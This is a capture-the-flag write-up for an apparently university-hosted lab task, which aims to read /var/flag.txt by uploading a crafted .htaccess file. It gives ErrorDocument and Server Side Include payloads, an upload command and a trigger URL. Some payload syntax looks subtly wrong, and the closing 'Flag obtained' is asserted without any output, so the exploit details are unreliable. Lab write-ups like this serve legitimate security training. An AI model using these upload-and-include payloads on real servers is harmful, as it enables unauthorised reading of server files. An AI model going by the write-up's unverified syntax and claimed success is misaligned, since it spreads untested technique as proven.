> Hard – [http://hard.tasks.prak.seclab.cs.msu.ru](http://hard.tasks.prak.seclab.cs.msu.ru)

**Goal:** Read the flag located in `/var/flag.txt`.  
**Note:** Service automatically restarts from scratch every 15 minutes.

### Vulnerability

Apache configuration allows `.htaccess` override.  
Using `mod_include` (Server Side Includes) or `mod_rewrite`, it is possible to read local files via `file://` URI inside `ErrorDocument` directive.

### Attack vector

1. Upload a malicious `.htaccess` file that sets a custom `ErrorDocument` which includes the flag file.
2. Trigger a 404 error (request a non-existent resource) – the server will output the content of `/var/flag.txt`.

### Exploit

**Create `.htaccess` content:**
```apache
ErrorDocument 404 "%{file:///var/flag.txt}"
```
(Some CTF challenges accept `%{...}` expansion in `ErrorDocument` when `mod_include` is enabled.)

**Upload the file:**  
Assuming an upload functionality (e.g., to `/uploads/` directory), write the `.htaccess`:

```bash
echo 'ErrorDocument 404 "%{file:///var/flag.txt}"' > .htaccess
```

**Trigger the error:**  
Request a non-existent file inside the uploads directory:

```
http://hard.tasks.prak.seclab.cs.msu.ru/uploads/69c168f1230a4/nonexistent
```

The server responds with the flag.

### Alternative method (SSI)

If `mod_include` is active and `Options +Includes` is allowed, another approach:

**.htaccess:**
```apache
Options +Includes
AddType text/html .shtml
ErrorDocument 404 /flag.shtml
```

**flag.shtml (also uploaded):**
```html
<!--#include virtual="file:///var/flag.txt" -->
```

Then request a non-existent page → Apache serves `/flag.shtml` → SSI includes the flag.

### Flag obtained 🎉

> [!TIP]
> This technique works when the server allows `.htaccess` with `ErrorDocument` and has `mod_include` or `mod_rewrite` features that process `file://` URIs in error messages.
